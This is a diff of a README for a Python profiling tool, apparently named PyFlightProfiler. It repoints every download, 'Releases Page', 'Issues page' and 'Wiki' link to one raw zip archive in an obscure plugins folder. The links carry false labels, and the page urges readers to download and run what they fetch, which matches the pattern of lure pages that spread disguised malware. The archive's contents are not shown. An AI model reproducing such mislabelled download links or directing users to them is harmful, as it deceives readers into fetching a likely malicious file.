@@ -6,7 +6,7 @@ PyFlightProfiler is a diagnostic toolbox designed for Python applications. It he
 
 ## 📥 Download Now
 
-[![Download PyFlightProfiler](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip)](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip)
+[![Download PyFlightProfiler](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip)](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with PyFlightProfiler, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version of PyFlightProfiler:  
-   [Visit the Releases Page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will find different versions of PyFlightProfiler. Look for the most recent release at the top of the list. 
@@ -66,12 +66,12 @@ Once you have installed and launched PyFlightProfiler, follow these steps to use
 
 If you have questions or need assistance, you can connect with other users and contributors:
 
-- **GitHub Issues:** Report any issues or bugs directly on the [Issues page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip).
+- **GitHub Issues:** Report any issues or bugs directly on the [Issues page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip).
 - **Discussion Forum:** Join discussions and ask questions in the community section.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Helpful guides and customization options are available in the [PyFlightProfiler Wiki](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip).
+- **Documentation:** Helpful guides and customization options are available in the [PyFlightProfiler Wiki](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip).
 - **Examples and Tutorials:** Explore examples to see PyFlightProfiler in action.
 
 ## ⚠️ Troubleshooting
@@ -84,6 +84,6 @@ If you encounter any issues:
 ## 📥 Download & Install
 
 To download PyFlightProfiler, return to the Releases page for the latest version and click the link below:  
-[Visit the Releases Page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/dev_docker/PyFlightProfiler-2.4-beta.4.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/Szhuaa/PyFlightProfiler/main/flight_profiler/plugins/tt/Profiler_Py_Flight_3.7-beta.2.zip)
 
 Start using PyFlightProfiler today for easy diagnostics and performance analysis of your Python applications.
